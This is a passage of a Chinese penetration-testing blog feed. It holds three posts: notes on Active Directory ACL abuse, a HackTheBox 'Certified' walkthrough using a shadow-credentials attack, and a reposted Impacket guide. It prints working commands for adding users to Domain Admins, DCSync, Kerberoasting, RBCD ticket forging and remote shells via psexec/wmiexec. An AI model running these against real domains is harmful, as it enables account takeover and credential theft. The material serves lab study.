admins用户添加</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Add-DomainObjectAcl  -TargetIdentity <span class="string">&quot;domain admins&quot;</span> -PrincipalIdentity test2user -Ri</span><br><span class="line">ghts  all -Verbose</span><br></pre></td></tr></table></figure><img src="/post/1f7550a0/IMAGE20250304115407551.png" class=""><p>这样的话可以用test2用户控制domain admins用户组</p><img src="/post/1f7550a0/IMAGE20250304115423788.png" class=""><h3 id="GenericWrite">GenericWrite</h3><p>GenericWrite也是在Access Mask中进行标识，此权限能够更新目标对象的属性值，可以使用PowerView中的Set-DomainObject方法设置目标属性的值。</p><img src="/post/1f7550a0/IMAGE20250304115452128.png" class=""><img src="/post/1f7550a0/IMAGE20250304115500120.png" class=""><h3 id="WriteDacl">WriteDacl</h3><p>WriteDacl允许委托人修改受影响对象的DACL。这意味着攻击者可以添加或删除特定的访问控制项，从而使他们可以授予自己对对象的完全访问权限。因此，WriteDacl是在链中启用其他权利的权利。</p><img src="/post/1f7550a0/IMAGE20250304115517528.png" class=""><h3 id="Self-Membership">Self-Membership</h3><p>WriteProperty直译为写所有权。这个权限利用针对的对象为组对象，能够赋予账户对于某个组的可写权限，在Domain Admins组里设置zhangs账户的WriteProperty权限：</p><img src="/post/1f7550a0/IMAGE20250304115736562.png" class=""><p>然后使用zhangs账户权限可以将xxm账户加入Domain Admins组：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group <span class="string">&quot;domain admins&quot;</span> xxm /add /domain</span><br></pre></td></tr></table></figure><h3 id="WriteOwner">WriteOwner</h3><p>WriteOwner权限允许委托人修改对象的安全描述符的所有者部分。也就是说，假如用户A对administrator用户有这个权限，那么A能利用这个权限给自己附加其他的权限。</p><img src="/post/1f7550a0/IMAGE20250304120232418.png" class=""><h3 id="WriteProperty-on-Group">WriteProperty on Group</h3><p>WriteProperty还包括了其他的权限：<br>CreateChild, DeleteChild, Self, WriteProperty, ExtendedRight, GenericRead, WriteDacl, WriteOwner<br>设置一个组的写入全部属性<br>（相当于获取了这个组的所有权限）</p><img src="/post/1f7550a0/IMAGE20250304120600128.png" class=""><p>在Domain Admins组的列表中添加写入全部属性，会生成一条新的ACE</p><img src="/post/1f7550a0/IMAGE20250304120615539.png" class=""><h3 id="WriteProperty-Self-Membership">WriteProperty (Self-Membership)</h3><p>WriteProperty直译为写所有权。这个权限利用针对的对象为组对象，能够赋予账户对于某个组的可写权限，在Domain Admins组里设置zhangs账户的WriteProperty权限：</p><img src="/post/1f7550a0/IMAGE20250304120715368.png" class=""><p>然后使用zhangs账户权限可以将xxm账户加入Domain Admins组：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group <span class="string">&quot;domain admins&quot;</span> xxm /add /domain</span><br></pre></td></tr></table></figure><h2 id="ACL攻击利用方式">ACL攻击利用方式</h2><h3 id="DCSync权限">DCSync权限</h3><p>使用dcsync获取dump 域hash需要域对象或者是域内的高权限组中有以下三种权限的其中一个：</p><ol><li>复制目录更改 Replicating Directory Changes (DS-Replication-Get-Changes)</li><li>复制目录更改所有 Replicating Directory Changes All (DS-Replication-Get-Changes-All)（Exchange用的就是这个）</li><li>正在复制筛选集中的目录更改 Replicating Directory Changes In Filtered Set (rare, only required in some environments)</li></ol><img src="/post/1f7550a0/IMAGE20250304140743126.png" class=""><h3 id="Exchange相关">Exchange相关</h3><p>参考：<a href="https://forum.butian.net/share/1837">https://forum.butian.net/share/1837</a></p><h3 id="Invoke-ACLPwn">Invoke-ACLPwn</h3><p>工具地址：<a href="https://github.com/fox-it/Invoke-ACLPwn">https://github.com/fox-it/Invoke-ACLPwn</a></p><p>Invoke-ACLPwn是一个Powershell脚本，设计用于使用集成凭据和指定凭据运行，该工具通过创建域中所有ACL的SharpHound导出以及运行该工具的用户帐户的组成员身份来工作，如果用户还没有域对象的writeDACL权限，该工具将枚举该域的ACL的所有ACE，ACE中的每个身份都有自己的ACL，它被添加到枚举队列中，如果身份是一个组并且该组有成员，则每个组成员也被添加到枚举队列中，正如您可以想象的那样，这需要一些时间来枚举，但最终可能会产生一个链来获取domain对象上的writeDACL权限</p><p>用法示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.\Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -NoDCSync</span><br><span class="line">.\Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe</span><br><span class="line">.\Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -userAccountToPwn <span class="string">&#x27;Administrator&#x27;</span></span><br><span class="line">.\Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -LogToFile</span><br><span class="line">.\Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -NoSecCleanup</span><br><span class="line">.\Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username <span class="string">&#x27;testuser&#x27;</span> -Domain <span class="string">&#x27;xenoflux.local&#x27;</span> -Password <span class="string">&#x27;Welcome01!&#x27;</span></span><br></pre></td></tr></table></figure><p>使用第一条标识了-NoDCSync（不会做DCSync的动作，只判断是否能够存在能够DCSync的权限）</p><p>参考：<br><a href="https://cloud.tencent.com/developer/article/2098661">https://cloud.tencent.com/developer/article/2098661</a><br><a href="https://www.cnblogs.com/nice0e3/p/15879624.html">https://www.cnblogs.com/nice0e3/p/15879624.html</a><br><a href="https://www.anquanke.com/post/id/212163">https://www.anquanke.com/post/id/212163</a><br>域渗透攻防指南</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;该篇文章主要转自&lt;br&gt;
&lt;a href=&quot;https://www.anquanke.com/post/id/212163&quot;&gt;https://www.anquanke.com/post/id/212163&lt;/a&gt; 详细请参考原文，本文只是方便自己查资料&lt;/p&gt;
&lt;h2 id</summary>
      
    
    
    
    <category term="攻防渗透" scheme="https://oceanzbz.github.io/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="windows" scheme="https://oceanzbz.github.io/tags/windows/"/>
    
    <category term="内网渗透" scheme="https://oceanzbz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Certified-HTB</title>
    <link href="https://oceanzbz.github.io/post/401ba5c9.html"/>
    <id>https://oceanzbz.github.io/post/401ba5c9.html</id>
    <published>2025-03-03T14:02:20.000Z</published>
    <updated>2025-03-05T07:24:36.809Z</updated>
    
    <content type="html"><![CDATA[<h2 id="信息收集">信息收集</h2><p>这是一台windows机器，并且开头题目给了一个用户名和密码，还是老规矩先简单扫描下端口然后在详细扫描下系统信息</p><p><code>nmap --min-rate 10000 -p- 10.10.11.41</code></p><img src="/post/401ba5c9/IMAGE20250303222313650.png" class=""><p>在来看看详细扫描</p><p><code>nmap -sT -sC -sV -O 10.10.11.41 </code></p><img src="/post/401ba5c9/IMAGE20250303223238540.png" class=""><p>很明显是一个域环境。</p><p>使用给的用户名和密码爆破下域内其他用户</p><p><code>crackmapexec smb certified.htb -u &quot;judith.mader&quot; -p &quot;judith09&quot; --rid-brute | grep SidTypeUser</code></p><img src="/post/401ba5c9/IMAGE20250303223914207.png" class=""><p>然后使用bloodhound-python 收集一下域内信息导入bloodhound分析一波</p><p><code>bloodhound-python -u judith.mader -p 'judith09' -c All -d certified.htb -ns 10.10.11.41 </code></p><p>搜索下judith.mader用户</p><img src="/post/401ba5c9/IMAGE20250303224659936.png" class=""><p>该用户对MANAGEMENT组有写的权限</p><img src="/post/401ba5c9/IMAGE20250304160117843.png" class=""><p>该组对MANAGEMENT_SVC用户拥有GenericWrite权限，可以修改目标安全对象的所有参数，包括对所有属性的修改。</p><img src="/post/401ba5c9/IMAGE20250304160359146.png" class=""><p>该用户又可以完全控制CA_OPERATOR用户。</p><h2 id="shadow-credentials-attack-（影子凭据攻击）">shadow credentials attack （影子凭据攻击）</h2><p>这一连串的权限控制符合影子凭据攻击的利用。具体原理参考：</p><p><a href="https://forum.butian.net/share/1607">https://forum.butian.net/share/1607</a><br><a href="https://www.freebuf.com/articles/network/331955.html">https://www.freebuf.com/articles/network/331955.html</a></p><p>修改 <strong><code>Management</code></strong> 组的 ACL，授予 <strong><code>judith.mader</code></strong> 用户 <strong><code>FullControl</code></strong> 权限，使其能够管理该组的成员</p><p><code>python3 dacledit.py -action write -rights 'FullControl' -principal judith.mader -target management -inheritance -dc-ip 10.10.11.41 certified.htb/judith.mader:judith09 -use-ldaps</code></p><p>然后把自己加入到该组</p><p><code>bloodyAD --host 10.10.11.41 -d 'certified.htb' -u 'judith.mader' -p 'judith09' add groupMember &quot;Management&quot; &quot;judith.mader&quot;</code></p><p>之后就是影子凭据攻击了</p><p>可以使用 <code>pywhisker.py</code> 工具进行 Kerberos 认证绕过操作，并且通过修改目标对象的 <code>msDS-KeyCredentialLink</code> 属性来生成并存储与目标相关的证书和密钥</p><p><code>python pywhisker.py -d &quot;certified.htb&quot; -u &quot;judith.mader&quot; -p judith09 --target management_svc --action add</code></p><p>然后请求获取 management_svc 的 TGT 票据，如果报错需要使用 ntpdate 同步时区</p><p>使用 <code>PKINITtools</code> 中的 <code>gettgtpkinit.py</code> 脚本来请求一个 Kerberos TGT（Ticket Granting Ticket），并且使用了之前生成的证书和密钥</p><p><code>python gettgtpkinit.py -cert-pfx ../pywhisker/pywhisker/oigNgAOY.pfx -pfx-pass F7ddKVbzqkaPtLgqVxFX certified.htb/management_svc hhh.ccache</code></p><p>使用 <code>PKINITtools</code> 中的 <code>getnthash.py</code> 脚本，通过已经获得的 TGT 来请求并恢复 <code>management_svc</code> 账户的 NT hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=/home/kali/Certified/PKINITtools/hhh.ccache</span><br><span class="line">python getnthash.py -key 07229e48b98f6800f3c17aaef3a49815c7b1fff0881969a3756856366a8a87f6 certified.htb/management_svc</span><br></pre></td></tr></table></figure><p>以上这些操作我在arm和x86版本的kali中都不太行，不知道为什么，也可能是靶机的原因，先记录下大佬的payload和思路。这里还可以利用certipy-ad工具进行利用</p><p><code>certipy-ad shadow auto -account management_svc -u judith.mader@certified.htb -p judith09 -dc-ip 10.10.11.41</code></p><p>后面就是一个ecs9的利用，这个靶机先到这吧回头有时间再看看吧。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;信息收集&quot;&gt;信息收集&lt;/h2&gt;
&lt;p&gt;这是一台windows机器，并且开头题目给了一个用户名和密码，还是老规矩先简单扫描下端口然后在详细扫描下系统信息&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nmap --min-rate 10000 -p- 10.10.11.41&lt;/code</summary>
      
    
    
    
    <category term="攻防渗透" scheme="https://oceanzbz.github.io/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="windows" scheme="https://oceanzbz.github.io/tags/windows/"/>
    
    <category term="渗透测试" scheme="https://oceanzbz.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="HTB" scheme="https://oceanzbz.github.io/tags/HTB/"/>
    
  </entry>
  
  <entry>
    <title>Impacket脚本使用</title>
    <link href="https://oceanzbz.github.io/post/f2535ba5.html"/>
    <id>https://oceanzbz.github.io/post/f2535ba5.html</id>
    <published>2025-03-03T03:45:23.000Z</published>
    <updated>2025-03-05T07:24:36.814Z</updated>
    
    <content type="html"><![CDATA[<p>本篇转载自<a href="https://xz.aliyun.com/news/11323">https://xz.aliyun.com/news/11323</a> ，详细信息请查看原文，本文只是为了自己查资料方便。</p><h1>Impacket脚本利用指南（上）</h1><p>Su1Xu3@深蓝攻防实验室</p><p>在平时的项目中，我们经常使用Impacket的脚本，例如Secretsdump、ntlmrelayx，但是实际上Impacket的利用除了示例脚本外还有很多，示例脚本只是其中一部分。因为Impacket的定位是一个处理各种网络协议的Python类。提供对数据包的底层编程，并为某些协议提供对应的协议实现。</p><p>不过因为示例脚本的可用性、以及示例脚本存在多种用法。所以这篇文章旨在研究学习Impacket所有示例脚本的功能，并通过示例脚本学习Impacket库的使用。</p><h1>Impacket的脚本介绍</h1><p>以下是本篇文章将会介绍使用方法的脚本一览：</p><table><thead><tr><th>类型</th><th>脚本名</th><th>脚本介绍</th></tr></thead><tbody><tr><td>远程执行</td><td><a href="http://psexec.py">psexec.py</a></td><td>使用了RemComSvc的实现了PSEXEC功能的脚本。</td></tr><tr><td>远程执行</td><td><a href="http://smbexec.py">smbexec.py</a></td><td>类似PSECEX的执行方式，但未使用RemComSvc。这个脚本使用了一个本地SMB Server接收返回的结果，可以避免目标SMB没有可写的目录</td></tr><tr><td>远程执行</td><td><a href="http://atexec.py">atexec.py</a></td><td>这个脚本通过MS-TSCH协议控制计划任务在目标机器上执行命令并获得回显</td></tr><tr><td>远程执行</td><td><a href="http://wmiexec.py">wmiexec.py</a></td><td>通过WMI实现了半交互式的Shell，不需要在目标安装任何服务或软件。而且高度隐蔽的以管理员权限运行</td></tr><tr><td>远程执行</td><td><a href="http://dcomexec.py">dcomexec.py</a></td><td>类似wmiexec.py的半交互式Shell，但是使用了DCOM接口，目前支持的接口有<code>MMC20.Application</code>、<code>ShellWindows</code>、<code>ShellBrowserWindows</code></td></tr><tr><td>Kerberos协议</td><td><a href="http://GetTGT.py">GetTGT.py</a></td><td>提供密码、hash或aeskey用来请求TGT并且保存为ccache格式</td></tr><tr><td>Kerberos协议</td><td><a href="http://GetST.py">GetST.py</a></td><td>提供密码、hash、aeskey或ccache格式的TGT，可以请求服务票据并保存为ccache格式。如果提供的账户存在约束委派且支持协议转换，那么可以使用-impersonate选项模拟为其他用户请求票据</td></tr><tr><td>Kerberos协议</td><td><a href="http://GetPac.py">GetPac.py</a></td><td>这个脚本会为指定用户请求经过身份验证的PAC，通过使用MS-SFU协议的S4USelf和U2U的Kerberos认证实现</td></tr><tr><td>Kerberos协议</td><td><a href="http://GetUserSPNs.py">GetUserSPNs.py</a></td><td>这个脚本会找出和普通用户账户关联的SPN，输出格式与JtR和hashcat兼容</td></tr><tr><td>Kerberos协议</td><td><a href="http://GetNPUsers.py">GetNPUsers.py</a></td><td>这个脚本会尝试获得并列出不需要Kerberos域认证(UF_DONT_REQUIRE_PREAUTH)的用户，输出和JtR兼容。</td></tr><tr><td>Kerberos协议</td><td><a href="http://rbcd.py">rbcd.py</a></td><td>这个脚本可以处理目标机器的msDS-AllowedToActOnBehalfOfOtherIdentity属性</td></tr><tr><td>Kerberos协议</td><td><a href="http://ticketConverter.py">ticketConverter.py</a></td><td>这个脚本可以在mimikatz常用的kirbi文件和Impacket常用的ccache文件之间进行转换</td></tr><tr><td>Kerberos协议</td><td><a href="http://ticketer.py">ticketer.py</a></td><td>这个脚本可以基于模板或自己创建金、银票据，并允许你自定义PAC_LOGON_INFO、groups、ExtraSids、duration等属性</td></tr><tr><td>Kerberos协议</td><td><a href="http://raiseChild.py">raiseChild.py</a></td><td>这个脚本通过金票据和ExtraSids实现从子域到域森林的提权</td></tr><tr><td>Windows密码</td><td><a href="http://secretsdump.py">secretsdump.py</a></td><td>提供各种技术以不运行任何程序远程dump密码。对SAM和LSA以及缓存的凭据，会尝试从目标注册表中读取并将hives保存在<code>%SYSTEMROOT%\Temp</code>目录，再将hives读取回来。对于DIT文件，会使用<code>DL_DRSGetNCChanges</code>函数来dump目标的NTLM hash、明文密码和Kerberos keys。也可以通过smbexec或wmiexec执行vssadmin得到NTDS.dit，并对其进行解密。这个脚本在服务不可用的情况下会打开对应的服务，例如远程注册表。在执行结束后，会将激活的服务还原。</td></tr><tr><td>Windows密码</td><td><a href="http://mimikatz.py">mimikatz.py</a></td><td>一个用来控制远程mimikatz RPC服务器的Shell，由@gentikiwi开发。</td></tr></tbody></table><h1>Impacket脚本使用实例</h1><h2 id="通用选项">通用选项</h2><h3 id="hash认证">hash认证</h3><p>py -3 <a href="http://xxx.py">xxx.py</a> domain/user@ip -hashes :161cff084477fe596a5db81874498a24</p><h3 id="Kerberos认证">Kerberos认证</h3><p>export KRB5CCNAME=ad01.ccache<br>py -3 <a href="http://xxx.py">xxx.py</a> -k -no-pass</p><h3 id="指定目标IP">指定目标IP</h3><p>-target-ip 192.168.40.156</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124122856-82299bf8-6bb0-1.png" alt=""></p><h3 id="指定域控IP">指定域控IP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-dc-ip 192.168.40.156</span><br></pre></td></tr></table></figure><h2 id="远程执行">远程执行</h2><h3 id="psexec-py"><a href="http://psexec.py">psexec.py</a></h3><p>可使用密码认证、hash认证、kerberos认证。</p><h4 id="常用命令">常用命令</h4><p><strong>交互式Shell</strong></p><p>py -3 <a href="http://psexec.py">psexec.py</a> test/administrator:1qaz@WSX@192.168.40.156</p><p><strong>执行单命令</strong></p><p>py -3 <a href="http://psexec.py">psexec.py</a> test/administrator:1qaz@WSX@192.168.40.156 whoami</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124122920-909b866a-6bb0-1.png" alt=""></p><p><strong>上传文件并执行</strong></p><p>py -3 <a href="http://psexec.py">psexec.py</a> test/administrator@192.168.40.156 “/c 1+1”  -remote-binary-name test.exe  -codec 936 -path c:\windows\temp\ -c p.exe -hashes :161cff084477fe596a5db81874498a24</p><h4 id="常用选项">常用选项</h4><p>-port [destination port] 指定目标SMB的端口<br>-codec codec 目标回显的编码，可先执行chcp.com拿到回显编码<br>-service-name service_name 指定创建服务的名称，默认随机<br>-remote-binary-name remote_binary_name 指定上传文件的名称，默认随机</p><h3 id="smbexec-py"><a href="http://smbexec.py">smbexec.py</a></h3><p>可使用密码认证、hash认证、kerberos认证。</p><p>需要注意此脚本有一些参数是硬编码的，最好使用前修改一下。还可以增加单行命令执行的功能。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124122940-9ce681ae-6bb0-1.png" alt=""></p><h4 id="常用命令-2">常用命令</h4><p><strong>交互式Shell</strong></p><p>py -3 <a href="http://smbexec.py">smbexec.py</a> test/administrator:1qaz@WSX@192.168.40.156</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124123005-ab53a01e-6bb0-1.png" alt=""></p><h4 id="常用选项-2">常用选项</h4><p>-share SHARE 自定义回显的共享路径，默认为C$<br>-mode {SHARE,SERVER} 设置SHARE回显或者SERVER回显，SERVER回显需要root linux<br>-shell-type {cmd,powershell} 设置返回的Shell类型</p><h3 id="atexec-py"><a href="http://atexec.py">atexec.py</a></h3><p>可使用密码认证、hash认证、kerberos认证。</p><p>脚本使用前可修改一下回显的共享路径</p><h4 id="常用命令-3">常用命令</h4><p><strong>执行命令获得回显</strong></p><p>py -3 <a href="http://atexec.py">atexec.py</a> test/administrator:1qaz@WSX@192.168.40.156 whoami</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124123158-eed26a6e-6bb0-1.png" alt=""></p><h4 id="常用选项-3">常用选项</h4><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124123225-ff09fdac-6bb0-1.png" alt=""></p><p>-session-id SESSION_ID 使用登录的SESSION运行（无回显，不会主动调用cmd如silentcommand）<br>-silentcommand 不运行cmd.exe，直接运行命令</p><h3 id="wmiexec-py"><a href="http://wmiexec.py">wmiexec.py</a></h3><p>可使用密码认证、hash认证、kerberos认证。</p><h4 id="常用命令-4">常用命令</h4><p>py -3 <a href="http://wmiexec.py">wmiexec.py</a> test/administrator:1qaz@WSX@192.168.40.156</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124123309-19264cea-6bb1-1.png" alt=""></p><h4 id="常用选项-4">常用选项</h4><p>-share SHARE 设置连接的共享路径，默认ADMIN$<br>-nooutput 不获取输出，没有SMB连接<br>-silentcommand 不运行cmd.exe，直接运行命令<br>-shell-type {cmd,powershell} 设置返回的Shell类型<br>-com-version MAJOR_VERSION:MINOR_VERSION 设置DCOM版本</p><h3 id="dcomexec-py"><a href="http://dcomexec.py">dcomexec.py</a></h3><p>可使用密码认证、hash认证、kerberos认证。</p><p>一般使用MMC20，而且DCOM有时候会遇到0x800706ba的错误，一般都是被防火墙拦截。</p><h4 id="常用命令-5">常用命令</h4><p>py -3 <a href="http://dcomexec.py">dcomexec.py</a> -object MMC20 <a href="http://test.com/administrator:1qaz@WSX@192.168.40.156">test.com/administrator:1qaz@WSX@192.168.40.156</a></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124123320-2005f006-6bb1-1.png" alt=""></p><h4 id="常用选项-5">常用选项</h4><p>-share SHARE 设置连接的共享路径，默认ADMIN$<br>-nooutput 不获取输出，没有SMB连接<br>-object [{ShellWindows,ShellBrowserWindow,MMC20}] 设置RCE利用的类型<br>-com-version MAJOR_VERSION:MINOR_VERSION 设置DCOM版本<br>-shell-type {cmd,powershell} 设置返回的Shell类型<br>-silentcommand 不运行cmd.exe，直接运行命令</p><h2 id="Kerberos协议">Kerberos协议</h2><h3 id="GetTGT-py"><a href="http://GetTGT.py">GetTGT.py</a></h3><p>可使用密码认证、hash认证、kerberos认证。</p><p>通过认证后去DC请求TGT并保存。</p><h4 id="常用命令-6">常用命令</h4><p>获取administrator用户的TGT，TGT过期前可拿来获取其权限</p><p>py -3 <a href="http://GetTGT.py">GetTGT.py</a> test/administrator:1qaz@WSX -dc-ip 192.168.40.156</p><h3 id="GetST-py"><a href="http://GetST.py">GetST.py</a></h3><p>可使用密码认证、hash认证、kerberos认证。</p><p>通过认证后去DC请求ST并保存。</p><h4 id="常用命令-7">常用命令</h4><p>用administrator的权限获取AD01.test.com的cifs服务的服务票据（ST）</p><p>py -3 <a href="http://GetST.py">GetST.py</a> test/administrator:1qaz@WSX -dc-ip 192.168.40.156 -spn cifs/AD01.test.com</p><h4 id="常用选项-6">常用选项</h4><p>-impersonate IMPERSONATE    模拟为指定的用户的权限<br>-additional-ticket ticket.ccache    在委派的S4U2Proxy中添加一个可转发的服务票据<br>-force-forwardable  通过CVE-2020-17049强制忽略校验票据是否可转发</p><h3 id="GetPac-py"><a href="http://GetPac.py">GetPac.py</a></h3><p>可使用密码认证、hash认证</p><h4 id="常用命令-8">常用命令</h4><p>查询test用户的PAC，可以看到登录次数、密码错误次数之类的</p><p>py -3 <a href="http://getPac.py">getPac.py</a> <a href="http://test.com/administrator:1qaz@WSX">test.com/administrator:1qaz@WSX</a> -targetUser test</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124123429-48cbe5a4-6bb1-1.png" alt=""></p><h3 id="GetUserSPNs-py"><a href="http://GetUserSPNs.py">GetUserSPNs.py</a></h3><p>可使用密码认证、hash认证、Kerberos认证</p><h4 id="常用命令-9">常用命令</h4><p>查询test.com中的用户的SPN有哪些，只需要任意一个域用户即可利用，只要有用户的SPN可以请求，可以获取其TGS爆破其密码</p><p>py -3 <a href="http://GetUserSPNs.py">GetUserSPNs.py</a> <a href="http://test.com/administrator:1qaz@WSX">test.com/administrator:1qaz@WSX</a> -target-domain <a href="http://test.com">test.com</a></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124123534-6f7ca594-6bb1-1.png" alt=""></p><h4 id="常用选项-7">常用选项</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-request 请求所有用户SPN的TGS，可拿来爆破用户密码</span><br><span class="line">-request-user username 请求指定用户的TGS</span><br><span class="line">-usersfile USERSFILE 请求指定文件内所有用户的TGS</span><br></pre></td></tr></table></figure><h3 id="GetNPUsers-py"><a href="http://GetNPUsers.py">GetNPUsers.py</a></h3><p>可使用密码认证、hash认证、Kerberos认证</p><h4 id="常用命令-10">常用命令</h4><p>查询域内哪些用户不需要Kerberos预身份认证，只需要任意一个域用户即可利用，只要有用户不需要Kerberos预身份认证，可以获取其AS_REQ拿来爆破其密码。</p><p>py -3 <a href="http://GetNPUsers.py">GetNPUsers.py</a> <a href="http://test.com/test:1qaz@WSX">test.com/test:1qaz@WSX</a></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124123542-743a237c-6bb1-1.png" alt=""></p><h4 id="常用选项-8">常用选项</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-request 请求不需要Kerberos预身份认证用户的TGT，可拿来爆破</span><br><span class="line">-format &#123;hashcat,john&#125; 设置AS_REQ的爆破格式，默认hashcat</span><br><span class="line">-usersfile USERSFILE 请求指定文件内所有用户的TGT</span><br><span class="line">-outputfile OUTPUTFILE 向指定文件输出结果</span><br></pre></td></tr></table></figure><h3 id="rbcd-py"><a href="http://rbcd.py">rbcd.py</a></h3><p>可使用密码认证、hash认证、Kerberos认证</p><p>rbcd这个脚本适合于已经有了一个域用户，然后发现该用户对目标机器的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性有写权限。例如有<code>GenericAll</code>就包含此子权限。</p><p>此时通过该域用户创建一个机器账户加入域，就能将机器账户的SID写入目标机器的属性中。从而让机器账户可以在目标机器上通过委派模拟为任意用户的权限。</p><h4 id="常用命令-11">常用命令</h4><p>使用test用户，向<code>WIN-7$</code>的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性写入<code>test_computer$</code>的SID</p><p>py -3 .\rbcd.py -delegate-to WIN-7$ -delegate-from test_computer$ -dc-ip 192.168.40.140 test/test:1qaz@WSX -action write</p><h4 id="常用选项-9">常用选项</h4><p>-action [{read,write,remove,flush}] 选择要对特殊属性进行的操作，可选读取、写入、删除、清空<br>-use-ldaps 使用LDAPS协议替换LDAP</p><h4 id="利用实例">利用实例</h4><p>因为这个脚本利用比较复杂，所以增加了利用实例</p><p>比如，此时我在域中拥有一个普通用户test:1qaz@WSX，通过ACL发现test对WIN-7具有<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>的写权限。</p><p>所以我先通过test添加一个computer，test_computer$:1qaz@WSX，命令如下：</p><p>py -3 <a href="http://addcomputer.py">addcomputer.py</a> <a href="http://test.com/test:1qaz@WSX">test.com/test:1qaz@WSX</a> -computer-name test_computer$ -computer-pass 1qaz@WSX</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124123552-7a7de570-6bb1-1.png" alt=""></p><p>然后通过test用户和rbcd.py脚本给WIN-7设置属性。将WIN-7$的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性指向test_computer$</p><p>py -3 .\rbcd.py -delegate-to WIN-7$ -delegate-from test_computer$ -dc-ip 192.168.40.140 test/test:1qaz@WSX -action write</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124123559-7e55e22e-6bb1-1.png" alt=""></p><p>设置好属性后，使用getST.py获取到administrator的<code>cifs/WIN-7</code>的服务票据（ST）</p><p>py -3 .\getST.py -spn ‘cifs/WIN-7’ -impersonate administrator -dc-ip 192.168.40.140 ‘test/test_computer$:1qaz@WSX’</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124123608-83b309d6-6bb1-1.png" alt=""></p><p>将生成的适合Linux使用的ccache格式转换为Windows的kirbi</p><p>py -3 .\ticketConverter.py .\administrator.ccache .\administrator.kirbi</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124123615-8814309a-6bb1-1.png" alt=""></p><p>通过mimikatz加载票据</p><p>kerberos::ptt C:\Python38\Scripts\administrator.kirbi</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124123621-8bb3e8d0-6bb1-1.png" alt=""></p><p>此时即可正式利用，可通过klist查看票据确实注入了。然后直接对目标的cifs进行dir操作，或通过psexec等横向手法横向即可。如下图所示：</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124123631-9197cea6-6bb1-1.png" alt=""></p><h4 id="无MAQ时的新利用方式">无MAQ时的新利用方式</h4><p>当用户具有A机器的写权限，但是无法新建机器利用rbcd，且当前用户没有可用的SPN时，可以使用该技术。该技术还未并入主进程。</p><p>使用UPN替代SPN进行rbcd。流程如下：</p><p>用test用户的权限请求模拟administrator用户的服务票据，仅在rbcd情况下有效。且获取TGT后要将TGT的Sessionkey改为test的hash。否则TGS无法解密</p><p>#请求test/test用户的TGT<br><a href="http://getTGT.py">getTGT.py</a> -hashes :$(pypykatz crypto nt ‘password’) test/test<br>#查看TGT里面的Ticket Session Key<br><a href="http://describeTicket.py">describeTicket.py</a> ‘TGT.ccache’ | grep ‘Ticket Session Key’<br>#将test/test用户的hash改为TGTSessionKey<br><a href="http://smbpasswd.py">smbpasswd.py</a> -newhashes :TGTSessionKey test/test:‘password’@‘dc01’<br>#通过委派模拟为administrator用户<br>KRBR5CCNAME=‘TGT.ccache’<br><a href="http://getST.py">getST.py</a> -u2u -impersonate Administrator -k -no-pass test/test<br>#还原test/test用户的hash<br><a href="http://smbpasswd.py">smbpasswd.py</a> -hashes :TGTSessionKey -newhashes :OldNTHash test/test@‘dc01’</p><p>参考资料：</p><p><a 